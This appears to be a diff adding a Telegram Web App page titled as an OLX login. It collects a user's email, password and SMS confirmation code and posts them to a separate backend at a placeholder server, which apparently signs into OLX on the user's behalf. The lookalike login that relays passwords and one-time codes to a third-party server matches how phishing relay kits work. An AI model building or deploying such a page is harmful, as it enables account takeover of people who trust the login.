@@ -1,0 +1,94 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: sans-serif; background: var(--tg-theme-bg-color); color: var(--tg-theme-text-color); }
+        input { width: 100%; padding: 10px; margin: 10px 0; border-radius: 8px; border: 1px solid #ccc; }
+        button { width: 100%; padding: 15px; background: #2ea6ff; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+    <div id="loginForm">
+        <h3>Вход в OLX</h3>
+        <input type="text" id="email" placeholder="Email или телефон">
+        <input type="password" id="password" placeholder="Пароль">
+        <button onclick="startLogin()">Войти</button>
+    </div>
+
+    <div id="smsForm" class="hidden">
+        <h3>Введите код из СМС</h3>
+        <p>OLX отправил код подтверждения</p>
+        <input type="text" id="smsCode" placeholder="Код из СМС">
+        <button onclick="sendSms()">Подтвердить</button>
+    </div>
+
+    <div id="status"></div>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // Адрес твоего бэкенда (Python сервера)
+        const API_URL = "https://tvoj-server.com/api"; 
+
+        async function startLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const userId = tg.initDataUnsafe.user.id;
+
+            document.getElementById('status').innerText = "🔄 Пробую войти... (это займет 10-20 сек)";
+            
+            // Отправляем данные боту
+            try {
+                const response = await fetch(`${API_URL}/login`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_id: userId, email, password })
+                });
+                
+                const data = await response.json();
+                
+                if (data.status === 'sms_required') {
+                    // Если OLX попросил СМС
+                    document.getElementById('loginForm').classList.add('hidden');
+                    document.getElementById('smsForm').classList.remove('hidden');
+                    document.getElementById('status').innerText = "";
+                } else if (data.status === 'success') {
+                    // Успех!
+                    tg.sendData(JSON.stringify({ action: 'login_success', account_id: data.account_id }));
+                    tg.close();
+                } else {
+                    document.getElementById('status').innerText = "❌ Ошибка: " + data.message;
+                }
+            } catch (e) {
+                document.getElementById('status').innerText = "Ошибка соединения";
+            }
+        }
+
+        async function sendSms() {
+            const code = document.getElementById('smsCode').value;
+            const userId = tg.initDataUnsafe.user.id;
+            
+            document.getElementById('status').innerText = "🔄 Проверяю код...";
+
+            const response = await fetch(`${API_URL}/verify-sms`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ user_id: userId, code })
+            });
+            
+            const data = await response.json();
+            
+            if (data.status === 'success') {
+                tg.sendData(JSON.stringify({ action: 'login_success', account_id: data.account_id }));
+                tg.close();
+            } else {
+                document.getElementById('status').innerText = "❌ Неверный код";
+            }
+        }
+    </script>
+</body>
+</html>
